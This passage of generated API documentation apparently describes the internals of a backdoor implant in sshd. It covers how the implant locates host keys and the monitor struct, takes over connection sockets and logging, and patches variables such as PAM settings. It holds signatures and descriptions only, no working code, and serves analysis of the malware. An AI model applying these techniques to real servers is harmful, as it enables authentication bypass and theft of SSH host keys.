<p>checks if the given serialized BIGNUM is negative </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">buf</td><td>buffer containing a serialized BIGNUM </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the serialized BIGNUM is negative, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aba4e5fd0dc2a11aa89a59865cc68807c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aba4e5fd0dc2a11aa89a59865cc68807c">&#9670;&nbsp;</a></span>sshd_configure_log_hook()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_configure_log_hook </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structcmd__arguments.html">cmd_arguments_t</a> *&#160;</td>
          <td class="paramname"><em>cmd_flags</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>configure the log hook </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">cmd_flags</td><td>flags controlling the log hook configuration </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a6e2c6750b30e0fa2fcc8ab1f5f17c597"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6e2c6750b30e0fa2fcc8ab1f5f17c597">&#9670;&nbsp;</a></span>sshd_find_main()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_find_main </td>
          <td>(</td>
          <td class="paramtype">u8 **&#160;</td>
          <td class="paramname"><em>code_start_out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>sshd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libcrypto</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>imported_funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the sshd_main function </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start_out</td><td>filled in with the function start, if found </td></tr>
    <tr><td class="paramname">sshd</td><td>sshd elf info </td></tr>
    <tr><td class="paramname">libcrypto</td><td>libcrypto elf info </td></tr>
    <tr><td class="paramname"><a class="el" href="structimported__funcs.html">imported_funcs</a></td><td>imported funcs </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a8bee0e68cc6b98d6efe609656cfad7d0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8bee0e68cc6b98d6efe609656cfad7d0">&#9670;&nbsp;</a></span>sshd_find_monitor_field_addr_in_function()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_find_monitor_field_addr_in_function </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>monitor_field_ptr_out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>find a pointer to a field in <code>struct monitor</code> by examining code referencing it </p>
<p>Look for a sequence of instructions:</p>
<p>mov/lea [&lt;addr&gt;] -&gt; reg1 ... mov reg1 -&gt; rdi ... call mm_request_send</p>
<p>where &lt;addr&gt; is in the the specified mem_range. Return the address in <code>monitor_field_ptr_out</code>.</p>
<p>In other words, look for:</p>
<p>mm_request_send(pmonitor-&gt;m_recvfd, ...);</p>
<p>And return the <code>&amp;pmonitor-&gt;m_recvfd</code> pointer.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>start of the sshd code segment </td></tr>
    <tr><td class="paramname">code_end</td><td>end of the sshd code segment </td></tr>
    <tr><td class="paramname">data_start</td><td>start of the (sshd) data segment </td></tr>
    <tr><td class="paramname">data_end</td><td>end of the (sshd) data segment </td></tr>
    <tr><td class="paramname">monitor_ptr_out</td><td>pointer to receive the address of the monitor struct </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="ad32fc521229739df889407c2e9e48475"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad32fc521229739df889407c2e9e48475">&#9670;&nbsp;</a></span>sshd_find_monitor_struct()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_find_monitor_struct </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the pointer to <code>struct monitor</code>, and updates the global context in <code>ctx</code> with its location </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">elf</td><td>sshd elf context </td></tr>
    <tr><td class="paramname">refs</td><td>sshd string references </td></tr>
    <tr><td class="paramname">ctx</td><td>global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the pointer has been found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a5f865a1a2eb6a32980c4336b2290e17e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5f865a1a2eb6a32980c4336b2290e17e">&#9670;&nbsp;</a></span>sshd_find_sensitive_data()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_find_sensitive_data </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>sshd</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libcrypto</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> within sshd, and resolves some additional libcrypto functions </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sshd</td><td>sshfd ELF context </td></tr>
    <tr><td class="paramname">libcrypto</td><td>libcrypto ELF context </td></tr>
    <tr><td class="paramname">refs</td><td>string references </td></tr>
    <tr><td class="paramname">funcs</td><td>imported functions </td></tr>
    <tr><td class="paramname">ctx</td><td>global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if <a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a> was located successfully, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aaa520bbc6de39ccb7a4e5013cf66d7aa"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aaa520bbc6de39ccb7a4e5013cf66d7aa">&#9670;&nbsp;</a></span>sshd_get_client_socket()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_client_socket </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int *&#160;</td>
          <td class="paramname"><em>pSocket</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>socket_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">enum SocketMode&#160;</td>
          <td class="paramname"><em>socket_direction</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Get either the read or write end of the sshd connection. </p>
<p>this is done by using the <code>struct monitor</code> address in <code>ctx</code> or, if not set, by getting the first usable socket having index <code>socket_index</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
    <tr><td class="paramname">pSocket</td><td>output variable that will receive the socket fd </td></tr>
    <tr><td class="paramname">socket_index</td><td>index <code>n</code> of the n-th usable socket that the function should return </td></tr>
    <tr><td class="paramname">socket_direction</td><td>whether to get the receiving or the sending socket </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the socket was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a75dff765c216d52b153ba98cf7cf0227"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a75dff765c216d52b153ba98cf7cf0227">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_address_via_krb5ccname()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_sensitive_data_address_via_krb5ccname </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>sensitive_data_out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the address of <code>sensitive_data.host_keys</code> in sshd by using getenv( STR_KRB5CCNAME ) </p>
<p>FIXME: add detail</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_start</td><td>start of the sshd data segment </td></tr>
    <tr><td class="paramname">data_end</td><td>end of the sshd data segment </td></tr>
    <tr><td class="paramname">code_start</td><td>start of the sshd code segment </td></tr>
    <tr><td class="paramname">code_end</td><td>end of the sshd code segment </td></tr>
    <tr><td class="paramname">string_refs</td><td>info about resolved functions </td></tr>
    <tr><td class="paramname">sensitive_data_out</td><td>pointer to receive the address of <a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the address was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ae0bd1e83c94cd866e022dd5867bee152"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae0bd1e83c94cd866e022dd5867bee152">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_address_via_xcalloc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_sensitive_data_address_via_xcalloc </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>string_refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>sensitive_data_out</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the address of <code>sensitive_data.host_keys</code> in sshd by using XREF_xcalloc_zero_size in <code>xcalloc</code> </p>
<p>FIXME: add detail</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_start</td><td>start of the sshd data segment </td></tr>
    <tr><td class="paramname">data_end</td><td>end of the sshd data segment </td></tr>
    <tr><td class="paramname">code_start</td><td>start of the sshd code segment </td></tr>
    <tr><td class="paramname">code_end</td><td>end of the sshd code segment </td></tr>
    <tr><td class="paramname">string_refs</td><td>info about resolved functions </td></tr>
    <tr><td class="paramname">sensitive_data_out</td><td>pointer to receive the address of <a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a> </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the address was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a7d1ef087d8cb5ea0a468fc42bb503049"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a7d1ef087d8cb5ea0a468fc42bb503049">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_score()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_sensitive_data_score </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>sensitive_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a8320540fc87f4c785714c52940a85571"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8320540fc87f4c785714c52940a85571">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_score_in_demote_sensitive_data()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_sensitive_data_score_in_demote_sensitive_data </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>sensitive_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>demote_sensitive_data</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int a score of 3 if accessed, 0 otherwise </dd></dl>

</div>
</div>
<a id="a5f78359c3bb3564a965009ee2280ac5a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5f78359c3bb3564a965009ee2280ac5a">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_score_in_do_child()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_sensitive_data_score_in_do_child </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>sensitive_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>do_child</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="aa83cef3858c167b051721db9fbd72667"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa83cef3858c167b051721db9fbd72667">&#9670;&nbsp;</a></span>sshd_get_sensitive_data_score_in_main()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_sensitive_data_score_in_main </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>sensitive_data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>main</code> accesses <code><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structsensitive__data.html" title="struct sensitive_data from openssh-portable">sensitive_data</a></td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a44abb1c444c5d0428c6d67b9e8e38276"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a44abb1c444c5d0428c6d67b9e8e38276">&#9670;&nbsp;</a></span>sshd_get_sshbuf()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_sshbuf </td>
          <td>(</td>
          <td class="paramtype">struct sshbuf *&#160;</td>
          <td class="paramname"><em>sshbuf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Finds the right <code>sshbuf</code> (FIXME: which?), starting from: <code>(*(ctx-&gt;struct_monitor_ptr_address))-&gt;kex-&gt;my</code> </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sshbuf</td><td>pointer to a sshbuf that will be filled with the values of the sshbuf </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the sshbuf was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a077a435ef7c8a7960451ff5c0cc5dc43"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a077a435ef7c8a7960451ff5c0cc5dc43">&#9670;&nbsp;</a></span>sshd_get_usable_socket()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_usable_socket </td>
          <td>(</td>
          <td class="paramtype">int *&#160;</td>
          <td class="paramname"><em>pSock</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>socket_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>imports</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the first usable socket fd </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">pSock</td><td>output variable that will receive the socket fd </td></tr>
    <tr><td class="paramname">socket_index</td><td>index <code>n</code> of the n-th usable socket that the function should return </td></tr>
    <tr><td class="paramname">imports</td><td>imported libc functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the socket was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a657f411379e9d088996d8722b82eeefd"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a657f411379e9d088996d8722b82eeefd">&#9670;&nbsp;</a></span>sshd_kex_sshbuf_get()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_kex_sshbuf_get </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>kex</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pOutputData</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t *&#160;</td>
          <td class="paramname"><em>pOutputSize</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>locates an sshbuf within <code>struct kex</code> (FIXME: which?) </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">kex</td><td>pointer to <code>struct kex</code> to search in </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
    <tr><td class="paramname">pOutputData</td><td>output variable that will receive the address of the sshbuf data </td></tr>
    <tr><td class="paramname">pOutputSize</td><td>output variable that will receive the size of the sshbuf data </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the sshbuf was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="adbd2f206ddcca1e6919558e0548990d7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#adbd2f206ddcca1e6919558e0548990d7">&#9670;&nbsp;</a></span>sshd_log()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void sshd_log </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>log_ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">LogLevel&#160;</td>
          <td class="paramname"><em>level</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>fmt</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>...</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <code>sshlogv</code> from openssh, similarly to <code>sshlog</code> in openssh </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">log_ctx</td><td>imported openssh log functions/data (to get the <code>sshlogv</code> function pointer) </td></tr>
    <tr><td class="paramname">level</td><td>log level </td></tr>
    <tr><td class="paramname">fmt</td><td>log format </td></tr>
    <tr><td class="paramname">...</td><td></td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a938289ac36ce7b17b60a4f5c0c28d2d4"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a938289ac36ce7b17b60a4f5c0c28d2d4">&#9670;&nbsp;</a></span>sshd_patch_variables()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_patch_variables </td>
          <td>(</td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>skip_root_patch</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>disable_pam</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>replace_monitor_reqtype</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>monitor_reqtype</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>global_ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Patches the sshd configuration. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
